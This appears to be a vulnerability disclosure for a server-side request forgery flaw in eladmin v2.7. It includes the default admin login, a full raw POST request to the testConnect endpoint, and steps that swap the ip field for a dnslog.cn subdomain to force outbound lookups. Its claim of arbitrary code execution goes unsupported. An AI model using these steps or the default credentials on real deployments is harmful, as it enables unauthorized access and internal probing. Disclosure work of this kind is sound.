# eladmin_ssrf

BUG_Author: shadia0

Affected version: eladmin v2.7 and before

Project Link: https://github.com/elunez/eladmin

URL: /api/serverDeploy/testConnect

Parameter: "ip"(POST)

## Description:

The eladmin v2.7 and before is vulnerable to Server-Side Request Forgery (SSRF) via `DeployController.java`. The malicious actor can use this vulnerability to execute arbitrary code. 
1. Log in to the backend with the project's default password `admin/123456`. Select '运维管理(Operations Management)' - '服务器(Server)' - '新增(Add New Server)' from the left menu in order, the server configuration box pops up.  Here you can fill in the server's IP. If you directly fill in a domain name here, it will be intercepted by the front end, but the back-end interface does not do this check.
<img width="1503" alt="image" src="https://github.com/user-attachments/assets/cbe0cbb4-8df4-4fcb-960e-accb52374759">
<img width="1579" alt="image" src="https://github.com/user-attachments/assets/ac0b40ec-eb51-44bb-8c88-05b6687c5511">

2. By filling in a valid IP and clicking 测试连接(Test Connection), you can trigger the following request packet.
   
```
POST /api/serverDeploy/testConnect HTTP/1.1
Host: localhost:8013
Content-Length: 104
sec-ch-ua: 
Accept: application/json, text/plain, */*
Content-Type: application/json
sec-ch-ua-mobile: ?0
Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJqdGkiOiJiM2E5OWNkY2NiNzk0NzRjOGUzYTUyN2E1ZmUzY2NiYiIsInVzZXIiOiJhZG1pbiIsInN1YiI6ImFkbWluIn0.NmbDtGywNsCE1dtK8ilWCwsEoPxO5F-aqj2jBIzyq45EDYfF9-PTqakUJz50fRo-D-sX8cBJpwQAUZpevgyijQ
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36
sec-ch-ua-platform: ""
Origin: http://localhost:8013
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:8013/mnt/mnt/serverDeploy
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: ELADMIN-TOEKN=Bearer%20eyJhbGciOiJIUzUxMiJ9.eyJqdGkiOiJiM2E5OWNkY2NiNzk0NzRjOGUzYTUyN2E1ZmUzY2NiYiIsInVzZXIiOiJhZG1pbiIsInN1YiI6ImFkbWluIn0.NmbDtGywNsCE1dtK8ilWCwsEoPxO5F-aqj2jBIzyq45EDYfF9-PTqakUJz50fRo-D-sX8cBJpwQAUZpevgyijQ
Connection: close

{"id":null,"name":"test_server","ip":"127.0.0.1","port":2222,"account":"root","password":"wrong"}
```


3. Generate a subdomain `lg2phe.dnslog.cn` on the dnslog platform, then change the IP `parameter` to `lg2phe.dnslog.cn` and send the request. It is found that the dns request parsing record is obtained on the dnslog platform, proving the ssrf vulnerability. (There are no requirements for other parameters such as account, password, etc., and you do not need to fill in the correct username and password to trigger the vulnerability)
<img width="1013" alt="image" src="https://github.com/user-attachments/assets/0cc24d0c-93c1-403c-8ba6-6274258df900">

<img width="1052" alt="image" src="https://github.com/user-attachments/assets/6265b19c-7fa2-4ba0-b91e-8da70002aeaf">





